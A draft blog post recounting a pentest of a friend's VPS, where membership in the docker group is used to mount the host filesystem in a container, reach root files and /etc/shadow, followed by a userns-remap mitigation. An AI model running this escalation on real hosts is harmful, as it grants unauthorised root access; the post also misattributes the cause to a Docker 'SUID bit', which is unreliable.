+++
title = "Privilege escalation using Docker"
date = "2020-08-25"
author = "Aloïs Micard"
authorTwitter = "" #do not include @
cover = ""
tags = ["Docker", "Security"]
keywords = ["", ""]
description = ""
showFullContent = false
draft = true
+++

I have done a little pentest audit on a friend VPS last week, he was providing Docker runtime
to some people, with SSH access, and wanted to know if his setup was secure.

By default, docker only allow to run command as root user, in most case this is not desired since giving
root access equals giving full power over the host. A simple workaround is to add the user to the 'docker'
group so that the user will be able to dial with the docker socket. And that's what my friend has done. But this setup
is **not secure at ALL** by default. 

Let's see how to use the docker group to gain full root access on the host.

This method is really similar to the [lxc group privilege escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation),
and that's how I've found this one.

# Privilege escalation

The only thing I had on the VPS was an un-privileged user, like the
others users.

```sh
creekorful@docker01:~$ id
uid=1001(creekorful) gid=1001(creekorful) groups=1001(creekorful),998(docker)
```

Here we can see that we are in the docker group, so we can use the docker daemon.

To gain root access one the host, one can create a docker container and mount the host disk
inside it.

This can be done with the following command:

```sh
creekorful@docker01:~$ docker run -it -v /:/mnt/root debian:stable-slim /bin/sh
#
```

Here we are asking docker to create a container using the *debian:stable-slim image*, and run the */bin/sh* command inside it.

```sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

We are now root inside the container. Since Docker has SUID bit set, we were able to mount the whole host disk
inside the /mnt/root partition (*-v /:/mnt/root*).

Let's try to display */root* folder:

```sh
# ls -altr /mnt/root/root
total 56
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
drwx------  2 root root  4096 Mar 27 07:52 .ssh
drwx------  2 root root  4096 Mar 27 22:43 .docker
drwxr-xr-x  3 root root  4096 Mar 27 23:07 .local
drwx------  3 root root  4096 Jun  8 09:40 .config
-rw-------  1 root root 14924 Jul  7 07:33 .viminfo
drwx------  6 root root  4096 Jul  7 07:33 .
-rw-r--r--  1 root root  5253 Jul 10 10:29 .bash_history
drwxr-xr-x 18 root root  4096 Aug 23 20:14 ..
```

It works! One can now change the root password in */etc/shadow* for example
and gain full root access on the host.

# How to mitigate the exploit?

Fortunately solutions exist to prevent this exploit. I will cover the most straightforward one.

Each unix process have a /proc/self/{u,g}id_map files. These files are used to give an ID mapping,
and are inherited.

```sh
creekorful@docker01:~$ cat /proc/self/{u,g}id_map
         0          0 4294967295
         0          0 4294967295
```

This file tells us: uid 0 for current process is mapped to parent uid 0, and it's the same up to uid 4294967295.

What we will do mitigate the exploit is to map container uid 0 to something non-root (!= 0), fortunately this can
be done easily by using /etc/sub{g,u}id files.

```sh
creekorful@docker01:~$ cat /etc/sub{g,u}id
debian:100000:65536
creekorful:165536:65536
debian:100000:65536
creekorful:165536:65536
```

These files are used to determinate the allowed range of sub {user,group} ID allowed to use by the user.
The format is: *<user>:<sub{g,u}id>:<sub{g,u}id count>*

So what we will do is add an *dockremap* (special docker user) entry to these files, and limit the sub{g,u}id of this user.

I have asked my friend to perform the following:

Add the dockremap entry to the /etc/subuid file:

```
root@docker01:~# echo 'dockremap:100:65536' >> /etc/subuid
```

By doing this we are saying: root inside the container (0) will be mapped to uid (100) in parent process (on the host).

Now we must ask docker to create the container using the *dockremap* user.
This can be done by modifying /etc/docker/daemon.json

```json
{
  "userns-remap": "default"
}
```

(Default means use dockremap user).

And finally, just restart the docker daemon to apply the changes.

# Let's try again

```sh
creekorful@docker01:~$ docker run -it -v /:/mnt/root debian:stable-slim /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

As we can see we are still root inside the container. But what's for the outside?

```sh
# cat /proc/self/uid_map
         0        100      65536
```

as you can see the lower uid is now 100 instead of 0. We are no more root.

Let's try to check the content of /etc/shadow:

```sh
# cat /mnt/root/etc/shadow
cat: can't open '/mnt/root/etc/shadow': Permission denied
```

the exploit is now mitigated.
